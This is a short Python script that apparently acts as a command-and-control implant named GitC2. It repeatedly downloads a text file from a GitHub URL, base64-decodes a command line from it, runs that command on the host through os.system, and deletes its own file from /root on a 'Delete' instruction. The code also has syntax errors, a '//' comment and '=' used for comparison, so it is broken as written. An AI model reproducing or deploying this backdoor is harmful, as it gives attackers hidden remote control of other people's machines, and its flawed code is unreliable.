import os, urllib.request, urllib.parse, base64, sys
from time import sleep
//keep the program running so can recieve new commands
while True:
  url='https://raw.githubusercontent.com/0x221b/GitC2/master/instructions3.txt'
  f = urllib.request.urlopen(url)
  req = f.read().decode('utf-8')

  reqs = req.split('\n')
  for i in reqs:
    if i[0:3] == "abc":
      bsf = i[4:]
  cmd = str(base64.b64decode(bsf))[2:-1]
  if cmd = "Delete":
    os.system("rm /root/gitc2.py")
    sys.exit()
  os.system(cmd)
  sleep(60)
